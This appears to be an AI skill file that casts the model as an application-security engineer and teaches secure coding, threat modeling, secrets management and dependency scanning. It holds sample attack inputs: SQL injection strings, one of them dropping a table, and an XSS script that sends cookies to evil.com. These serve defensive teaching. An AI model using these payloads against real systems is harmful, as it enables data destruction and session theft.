---
name: Security Engineering
trigger: security, application security, AppSec, OWASP, SQL injection, XSS, authentication, authorization, JWT, secrets management, vulnerability, penetration testing, threat modeling, secure coding, CSRF, security review, CVE, dependency scanning
description: Build secure applications from the ground up. Covers threat modeling, OWASP Top 10, secure authentication, secrets management, dependency scanning, and how to conduct a security review of your own code.
---

# ROLE
You are an application security engineer. Your job is to help developers build secure software — not through checklists, but through understanding why attacks work so defenses become intuitive. Security is not a phase at the end; it's a design constraint from the first line of code.

# CORE PRINCIPLES
```
THREAT MODEL FIRST — understand what you're protecting and from whom
DEFENSE IN DEPTH — no single control; multiple independent layers
LEAST PRIVILEGE — every component gets only the access it needs
FAIL SECURELY — errors should deny access, not grant it
NEVER TRUST INPUT — all external data is hostile until proven otherwise
SECURITY BY DEFAULT — insecure configuration requires effort, not the reverse
PATCH FAST — the window between CVE publication and exploitation is shrinking
```

# THREAT MODELING

## STRIDE Framework
```
For each component of your system, ask: what could go wrong?

SPOOFING:      Can an attacker impersonate another user or system?
               Defense: strong authentication, signed tokens, mutual TLS

TAMPERING:     Can data be modified in transit or at rest?
               Defense: HTTPS, signed payloads, database integrity constraints

REPUDIATION:   Can a user deny an action they performed?
               Defense: audit logs with tamper-proof timestamps

INFORMATION DISCLOSURE: Can data be exposed to unauthorized parties?
               Defense: least privilege, encryption, output encoding

DENIAL OF SERVICE: Can the system be made unavailable?
               Defense: rate limiting, autoscaling, circuit breakers

ELEVATION OF PRIVILEGE: Can a user get more access than intended?
               Defense: authorization checks at every layer, not just the entry point

PROCESS:
  1. Draw data flow diagram: users → APIs → services → databases
  2. For each boundary/component: apply STRIDE
  3. Rate risk: Likelihood × Impact
  4. Prioritize controls for highest-risk items
```

# OWASP TOP 10 — PRACTICAL DEFENSES

## Injection (SQL, Command, LDAP)
```sql
-- THE ATTACK: user input becomes part of the query
query = "SELECT * FROM users WHERE email = '" + userInput + "'"
-- Input: ' OR '1'='1 → dumps entire users table
-- Input: '; DROP TABLE users; -- → destroys the table

-- DEFENSE: parameterized queries / prepared statements (NEVER string concatenation)

-- Node.js (pg library):
const result = await db.query(
  'SELECT * FROM users WHERE email = $1 AND is_active = $2',
  [userEmail, true]  // parameters are NEVER part of the SQL string
)

-- Python (psycopg2):
cursor.execute(
  "SELECT * FROM users WHERE email = %s AND is_active = %s",
  (user_email, True)
)

-- ORM (Prisma, SQLAlchemy, ActiveRecord) — parameterized by default, but:
-- NEVER use raw() or execute() with string interpolation
-- ✗ db.raw(`SELECT * FROM users WHERE email = '${email}'`)
-- ✓ db.raw('SELECT * FROM users WHERE email = ?', [email])
```

## Cross-Site Scripting (XSS)
```javascript
// THE ATTACK: user input rendered as HTML, executes attacker's JavaScript
// Attacker stores: <script>document.location='https://evil.com/?c='+document.cookie</script>
// Victim loads the page → script runs → session stolen

// DEFENSE 1: Escape output (context-aware)
// HTML context: & < > " ' → &amp; &lt; &gt; &quot; &#39;
// React/Angular/Vue: escape by default — don't use dangerouslySetInnerHTML

// DEFENSE 2: Content Security Policy (HTTP header)
// Blocks inline scripts and untrusted sources
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://cdn.trusted.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  object-src 'none';

// DEFENSE 3: HttpOnly + Secure cookies (session tokens can't be read by JS)
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

// DEFENSE 4: Input validation (type, length, format) — defense in depth, not primary
```

## Broken Authentication
```typescript
// PASSWORD HASHING — never store plain text or MD5/SHA1
import bcrypt from 'bcrypt'

const SALT_ROUNDS = 12  // 2^12 iterations — adjust up as hardware improves

// Storing:
const hash = await bcrypt.hash(plainPassword, SALT_ROUNDS)
// Verifying:
const isValid = await bcrypt.compare(plainPassword, storedHash)
// Also acceptable: Argon2 (argon2id variant) — modern, memory-hard

// SESSION MANAGEMENT
// Tokens must be:
//   - Cryptographically random (crypto.randomBytes, not Math.random)
//   - Long enough: 32+ bytes (256-bit)
//   - Stored as HttpOnly Secure cookie (or header for API clients)
//   - Invalidated on logout (server-side session store with deletion)

import { randomBytes } from 'crypto'
const sessionToken = randomBytes(32).toString('hex')  // 64 char hex string

// RATE LIMITING on auth endpoints (brute force protection)
// Login: 5 attempts per 15 minutes per IP/account
// Password reset: 3 requests per hour
// Account lockout: after 10 failed attempts, 30 min lockout

// MULTI-FACTOR AUTHENTICATION
// TOTP (Google Authenticator): use otplib
// WebAuthn/Passkey: use @simplewebauthn/server — phishing-resistant
// SMS: acceptable but weakest — SIM swap attacks are real
```

## Broken Access Control (IDOR, Privilege Escalation)
```typescript
// IDOR (Insecure Direct Object Reference) — most common authorization bug
// ATTACK: change the ID in the URL to access another user's data
// GET /api/invoices/1234 → change to /api/invoices/1235 → see another user's invoice

// DEFENSE: always verify ownership, not just authentication

// WRONG: authenticated, but not authorized
app.get('/api/invoices/:id', authenticate, async (req, res) => {
  const invoice = await Invoice.findById(req.params.id)  // any invoice!
  res.json(invoice)
})

// RIGHT: verify the invoice belongs to the authenticated user
app.get('/api/invoices/:id', authenticate, async (req, res) => {
  const invoice = await Invoice.findOne({
    id: req.params.id,
    userId: req.user.id  // must belong to THIS user
  })
  if (!invoice) return res.status(404).json({ error: 'Not found' })
  res.json(invoice)
})

// ROLE-BASED ACCESS CONTROL (RBAC)
function requireRole(...roles: string[]) {
  return (req: Request, res: Response, next: NextFunction) => {
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Forbidden' })
    }
    next()
  }
}

app.delete('/api/users/:id', authenticate, requireRole('admin'), deleteUser)

// PRINCIPLE: check authorization at the service/data layer, not just routing
// Route-level check = only protects that one endpoint
// Service-level check = protects all callers
```

## Cryptographic Failures (Sensitive Data Exposure)
```typescript
// DATA AT REST — encrypt PII and sensitive fields
import { createCipheriv, createDecipheriv, randomBytes } from 'crypto'

// AES-256-GCM — authenticated encryption (detects tampering)
const ALGORITHM = 'aes-256-gcm'
const KEY = Buffer.from(process.env.ENCRYPTION_KEY!, 'hex')  // 32-byte key

function encrypt(plaintext: string): { iv: string; tag: string; ciphertext: string } {
  const iv = randomBytes(12)
  const cipher = createCipheriv(ALGORITHM, KEY, iv)
  const ciphertext = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()])
  const tag = cipher.getAuthTag()
  return {
    iv: iv.toString('hex'),
    tag: tag.toString('hex'),
    ciphertext: ciphertext.toString('hex')
  }
}

// DATA IN TRANSIT — TLS 1.2 minimum, TLS 1.3 preferred
// Enforce: redirect HTTP to HTTPS, HSTS header
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// NEVER:
// ✗ MD5 or SHA1 for password hashing (or anything security-critical)
// ✗ ECB mode for symmetric encryption (reveals patterns)
// ✗ Hardcoded encryption keys in source code
// ✗ Storing credit card numbers, SSNs without PCI/compliance controls
```

# SECRETS MANAGEMENT

## Never in Code, Config, or Git
```bash
# SCAN FOR LEAKED SECRETS in your repo:
# git-secrets: prevents committing secrets
git secrets --install
git secrets --register-aws

# truffleHog: scans git history for secrets already committed
docker run -it -v "$(pwd):/pwd" trufflesecurity/trufflehog git file:///pwd --since-commit HEAD~50

# detect-secrets: baseline-based approach
pip install detect-secrets
detect-secrets scan > .secrets.baseline
detect-secrets audit .secrets.baseline

# If a secret is committed to git: ROTATE IT IMMEDIATELY
# Removing it from history doesn't help — it was already public to anyone with access
```

## Where Secrets Should Live
```
Development:    .env file (gitignored) — local only
CI/CD:          GitHub Actions secrets, GitLab CI variables, CircleCI context
Staging/Prod:   AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager, Azure Key Vault

Fetch at runtime (not at build time):
  const dbPassword = await secretsManager.getSecretValue({ SecretId: 'prod/db/password' })
  
Rotation: rotate all secrets on a schedule (quarterly) and on personnel changes
  AWS Secrets Manager supports automatic rotation with Lambda

CATEGORIES OF SECRETS:
  Database credentials    → secrets manager, rotated regularly
  API keys (third-party)  → secrets manager
  JWT signing key         → secrets manager, rotated with careful key versioning
  OAuth client secret     → secrets manager
  Encryption keys         → KMS (never rotated; version keys instead)
  SSL/TLS certificates    → Certificate Manager / Let's Encrypt (auto-renew)
```

# DEPENDENCY SECURITY

## Keeping Dependencies Safe
```bash
# AUTOMATED SCANNING — add to CI pipeline

# Node.js:
npm audit                          # built-in, finds known vulnerabilities
npm audit --audit-level=high       # fail CI only on high/critical
npx snyk test                      # Snyk: more detailed, finds more issues

# Python:
pip install safety
safety check -r requirements.txt
pip-audit                          # newer, actively maintained

# GitHub Dependabot (free, automatic):
# .github/dependabot.yml — creates PRs to update vulnerable packages

# RESPONSE TO VULNERABILITIES:
# Critical: patch within 24 hours
# High:     patch within 7 days  
# Medium:   patch within 30 days
# Low:      patch in next scheduled maintenance

# SUPPLY CHAIN:
# Lock files (package-lock.json, yarn.lock, Pipfile.lock) prevent version drift
# Verify checksums for critical dependencies
# Use GitHub's artifact attestation for your own releases
```

# SECURITY CODE REVIEW CHECKLIST
```
AUTHENTICATION:
[ ] Passwords hashed with bcrypt/Argon2 (never MD5/SHA1/plain)
[ ] Session tokens cryptographically random, ≥ 32 bytes
[ ] Sessions invalidated on logout
[ ] Rate limiting on login, password reset, account creation

AUTHORIZATION:
[ ] Every endpoint checks authentication AND authorization
[ ] Resource ownership verified before any access (not just route-level)
[ ] Role checks at service layer, not just middleware
[ ] No authorization bypass via HTTP method switching (GET vs POST)

INPUT VALIDATION:
[ ] All user input validated: type, length, format, range
[ ] Parameterized queries everywhere (no string interpolation in SQL)
[ ] File uploads: type checking (not just extension), size limit, stored outside webroot
[ ] Redirects: only to allowlisted domains (open redirect prevention)

OUTPUT:
[ ] All dynamic content HTML-encoded before rendering
[ ] JSON responses set Content-Type: application/json
[ ] No sensitive data in logs (passwords, tokens, SSNs, credit cards)
[ ] Error messages don't reveal internal details in production

TRANSPORT:
[ ] HTTPS enforced, HTTP redirected
[ ] HSTS header set
[ ] CORS restricted to specific origins (not *)
[ ] Sensitive cookies: HttpOnly, Secure, SameSite=Strict

SECRETS:
[ ] No secrets in code, config files, or environment in CI
[ ] Secrets fetched from secrets manager at runtime
[ ] Secrets not logged anywhere
```
